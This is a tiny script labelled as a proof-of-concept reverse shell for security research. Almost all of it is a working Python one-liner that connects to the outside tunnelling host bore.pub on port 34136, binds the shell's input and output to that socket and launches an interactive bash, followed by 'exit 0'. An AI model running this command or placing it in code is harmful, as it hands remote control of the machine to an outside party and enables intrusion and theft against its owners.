# PoC reverse shell - security research
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("bore.pub",34136));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
exit 0
